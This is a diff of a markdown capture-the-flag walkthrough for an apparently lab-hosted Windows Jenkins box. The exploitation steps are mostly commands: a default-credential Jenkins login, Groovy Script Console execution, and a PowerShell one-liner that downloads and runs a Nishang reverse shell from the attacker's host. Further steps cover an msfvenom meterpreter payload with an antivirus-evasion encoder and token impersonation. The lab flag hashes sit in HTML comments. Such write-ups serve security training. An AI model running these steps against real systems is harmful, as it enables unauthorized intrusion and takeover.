@@ -4,8 +4,9 @@
   <img src='https://github.com/user-attachments/assets/335a1059-b792-4edc-a5e2-ea767b35e798' height='200'></img>
 </div>
 
-# Step 1: Recconance 
-```
+### Step 1: Reconnaissance
+
+```bash
 :~$ nmap -sV 10.10.219.84
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-04 20:35 IST
 Nmap scan report for 10.10.219.84
@@ -17,195 +18,240 @@ PORT     STATE SERVICE            VERSION
 8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
-1. The scan shows there are 3 ports open
-* `80` with web service.
-* `3389` useless
-* `8080` jenkins running
 
-The port number 80 as default let take a look
+The Nmap scan reveals three open ports:
+
+* **Port 80** – HTTP service (Microsoft IIS 7.5)
+* **Port 3389** – RDP (likely not useful at this point)
+* **Port 8080** – Running Jetty server (possibly hosting Jenkins)
+
+#### Exploring Port 80
+
+Since port 80 is usually the default web service, let's visit it in the browser:
 
 ![image](https://github.com/user-attachments/assets/7483aad4-dbc8-4c4c-b387-ae7b2848ea25)
 
-find nothing usefull here 
+Unfortunately, there's nothing useful here.
 
-2. As the Jenkins version is outdated let take a look at it
+#### Checking Out Port 8080 (Jenkins)
+
+Given that the Jetty server is running on port 8080 and the version looks outdated, let’s take a look.
 
 ![image](https://github.com/user-attachments/assets/84cdf8d0-1e7e-4d29-9853-e5010f586658)
 
-Okay let try default credentials `admin:admin`
+Let's try the classic move: default credentials `admin:admin`.
 
 ![image](https://github.com/user-attachments/assets/a53f02a6-4d96-4c6f-94ca-ea4b7376ead0)
 
-bingo ! im genious
+**Bingo!** We're in 😎 — call me a genius!
 
+### Step 2: Exploitation
 
-# Step 2: Exploitation
-After Scrollig for long i found a this in `Manage Jenkins` > There is `Script Console`
+While scrolling through the Jenkins interface, I finally found something promising under **Manage Jenkins** → **Script Console**.
 
 ![image](https://github.com/user-attachments/assets/4a883914-a503-4df8-b551-98415f9cc72b)
 
-After wasting some time i understand the:
+After experimenting for a bit, I figured out how to run commands. Let’s test it by listing the contents of the `C:` drive using:
 
-let swape cmd and take a look at `C:` drive:
-
-```
+```groovy
 cmd = "cmd.exe /c dir"
 println cmd.execute().text
 ```
 
 ![image](https://github.com/user-attachments/assets/08208f34-aedc-4bf8-b079-79792292dfb5)
 
-We got some data Now can cast a reverse shell here but 1st we need a reverse shell 
-```
+Nice! We got some output. Now let’s move on to getting a reverse shell.
+
+### Preparing the Reverse Shell
+
+We'll use **Nishang**, a collection of PowerShell scripts for exploitation. Clone the repo:
+
+```bash
 git clone https://github.com/samratashok/nishang
 ```
 
-Go to this directory 
-```
+Navigate to the `Shells` directory:
+
+```bash
 cd nishang/Shells/
 ```
 
-Now we need to pull our revrse shell from our system and place and execute that into target system for doing that in `Shell` directory open a python server to pull the reverse shell form it:
-```
+Now, we’ll host the reverse shell script using a simple Python HTTP server:
+
+```bash
 python3 -m http.server
 ```
 
 ![image](https://github.com/user-attachments/assets/ec758bd2-d1b0-4211-8d65-cf8fcf5eafc7)
 
-Now Set up a `Netcat` listner on differet port:
-```
+Meanwhile, set up a Netcat listener on a different port to catch the shell:
+
+```bash
 nc -lnvp 1234
 ```
-For reverse connection
 
-Now we need to download this reverse shell into traget system
-```
-cmd = "powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-Listner-port"
+### Executing the Reverse Shell
+
+We’ll download and execute the reverse shell script on the target machine via the Jenkins Script Console:
+
+```groovy
+cmd = "powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port"
 println cmd.execute()
 ```
 
-Like this:
-```
+Example with my setup:
+
+```groovy
 cmd = "powershell iex (New-Object Net.WebClient).DownloadString('http://10.17.14.127:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.17.14.127 -Port 1234"
 println cmd.execute()
 ```
 
-Got the Connection 
+And... **boom!** Got the reverse shell back:
 
 ![image](https://github.com/user-attachments/assets/9e6bc915-db95-4347-bcd8-d57eeb0c8c3e)
 
-# Step 3: Post Exploitation
+### Step 3: Post Exploitation
 
-## User flag.txt
-```
+#### User Flag.txt
+
+We begin by retrieving the `user.txt` file from the compromised system:
+
+```powershell
 cat 'C:\Users\bruce\Desktop\user.txt'
 ```
+
 <!-- 79007a09481963edf2e1321abd9ae2a0 -->
+
 ![image](https://github.com/user-attachments/assets/d78864b1-d5c9-46fc-a42c-bec8cfbff9f8)
 
 
-## Switching Shells
-To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.
+### Step 4: Privilege Escalation
 
-Use msfvenom to create a Windows meterpreter reverse shell using the following payload:
-```
-msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-test.exe
+#### Switching to Meterpreter
+
+To make privilege escalation easier and more efficient, let’s upgrade to a **Meterpreter shell** using a custom payload.
+
+Generate the payload with `msfvenom`:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<your-ip> LPORT=<your-port> -f exe -o shell-test.exe
 ```
 
-This payload generates an encoded x86-64 reverse TCP meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.
+This payload uses the `x86/shikata_ga_nai` encoder to help evade antivirus detection.
 
-Start Msfconsole
-```
+#### Setting Up the Handler
+
+Start **Metasploit Framework Console**:
+
+```bash
 msfconsole -q
 ```
-Start A TCP reverse Handler for connection
-```
-use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp
-```
-Set Lhost
-```
-set LHOST your-thm-ip set
-```
-Set Lport
-```
-LPORT 5555
-```
-Start the Listner
-```
+
+Configure the handler:
+
+```bash
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <your-thm-ip>
+set LPORT 5555
 run
 ```
 
-First We need to download the our Payload in the Enemy system for doing that open new terminal where your playload is created in my case it `/home/user`
-```
+#### Delivering the Payload
+
+Now, we need to transfer the `shell-test.exe` file to the target. From the directory where your payload is saved (e.g., `/home/user`), run a simple Python server:
+
+```bash
 python3 -m http.server
 ```
 
-Download using this command on cmd
-```
-powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"
+On the target (via the reverse shell), download the file:
+
+```powershell
+powershell "(New-Object System.Net.WebClient).DownloadFile('http://<your-thm-ip>:8000/shell-test.exe','shell-test.exe')"
 ```
 
 ![image](https://github.com/user-attachments/assets/4408c39f-2e4b-4662-abd9-33f0291d7937)
 
-Let executt it
-```
+Execute the payload:
+
+```powershell
 Start-Process "shell-test.exe"
 ```
+
 ![image](https://github.com/user-attachments/assets/ec6fbbcd-504b-4557-86e0-e49ed71d4b73)
 
-Now Let Swape shell
-```
+Once the Meterpreter shell is received, type:
+
+```bash
 shell
 ```
+
 ![image](https://github.com/user-attachments/assets/f52a258f-15aa-4005-b744-567a4465c22a)
 
-Let Check for privillage
+#### Privilege Escalation via Token Impersonation
+
+Check current privileges:
+
+```powershell
+whoami /priv
 ```
-whoami /prive
-```
+
 ![image](https://github.com/user-attachments/assets/c873e060-900e-4642-b150-32b0005d4af6)
 
-You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability.
+We see `SeDebugPrivilege` and `SeImpersonatePrivilege` are enabled — perfect for token impersonation.
 
-Enter: `load incognito` to load the incognito module in Metasploit. Please note that you may need to use the use incognito command if the previous command doesn't work. Also, ensure that your Metasploit is up to date.
-```
+Load the **incognito** module in Meterpreter:
+
+```bash
 load incognito
 ```
-Press `ctrl`+`c` to exit shell and back to meterpreter
 
-Let see which tokens are available
-```
+> If `load incognito` fails, try `use incognito` or ensure your Metasploit is updated.
+
+Press `Ctrl+C` to exit the shell and return to the Meterpreter prompt.
+
+List available tokens:
+
+```bash
 list_tokens -g
 ```
+
 ![image](https://github.com/user-attachments/assets/580e84f2-ddf3-4c5c-a265-50404dd99b3e)
 
-We can see that the BUILTIN\Administrators token is available.
+We can see that the `BUILTIN\Administrators` token is available.
 
-Let  impersonate the Administrators' token:
-```
-impersonate_token "BUILTIN\Administrators"
+Impersonate it:
+
+```bash
+impersonate_token "BUILTIN\\Administrators"
 ```
 
 ![image](https://github.com/user-attachments/assets/15dfdeb9-451f-4199-84b2-ab173774e818)
 
-## Root Flag.txt
+### Final Step: Root Flag
 
-Let Migrate our permissions
-
-to migrate check the running process
+Before reading the root flag, let’s migrate to a stable system process for persistence. View running processes:
 
 ![image](https://github.com/user-attachments/assets/0ee6b838-9ec2-434e-aa7a-81c4f56eeb4b)
 
-Let migrate to this service
+Choose a stable process and migrate to it:
+
+```bash
+migrate <PID>
 ```
-migrate PID-OF-PROCESS
-```
+
 ![image](https://github.com/user-attachments/assets/c1b0fc0a-a1f4-4769-8e52-1bf3016fda1f)
 
-View Our Flag
-```
+#### Root Flag.txt
+
+Once you have SYSTEM privileges, retrieve the root flag:
+
+```powershell
 type 'C:\Windows\System32\config\root.txt'
 ```
 
 ![image](https://github.com/user-attachments/assets/609af3d5-7e0b-43b4-a689-640cbde2695e)
-<!!-- dff0f748678f280250f25a45b8046b4a -->
+
+<!-- dff0f748678f280250f25a45b8046b4a -->
+
